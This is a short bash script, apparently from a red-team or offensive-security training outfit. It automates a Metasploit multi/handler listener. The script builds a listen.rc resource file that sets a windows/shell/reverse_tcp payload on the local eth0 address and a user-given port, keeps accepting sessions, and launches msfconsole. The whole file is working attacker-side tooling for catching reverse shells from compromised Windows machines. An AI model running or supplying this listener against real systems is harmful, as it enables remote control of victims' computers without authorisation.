

#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+------------------------------------------------+"
echo -e "|   Adversarial Informatics Combat MSF Listener  |"
echo -e "|              cygienesolutions.com              |"
echo -e "|       [Usage]: ./msf_handler_aic.sh <PORT>     |"
echo -e "+------------------------------------------------+"
#echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Execute this script with a port specification to"
    echo -e "start an MSF multihandler on the local system."
    echo -e "The local IP address is automatically assigned (eth0)."
    echo -e "${NC}"
    exit 1; fi

PORT=$1
LOCALIP=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')

echo -e "${GREEN}"
echo -e "Ensuring MSF database is activated..."
service postgresql start
echo -e "${NC}"


echo -e "${GREEN}"
echo -e "Building the listen.rc configuration file..."
echo -e "${NC}"

echo 'use exploit/multi/handler' > listen.rc
echo 'set payload windows/shell/reverse_tcp' >> listen.rc
echo 'set lhost' $LOCALIP >> listen.rc
echo 'set lport' $PORT >> listen.rc
echo 'set ExitOnSession false' >> listen.rc
echo 'run' >> listen.rc

echo -e "${GREEN}"
echo -e "Starting the MSF Multihandler with a shell_reverse_tcp..."
echo -e "${NC}"

msfconsole -r listen.rc
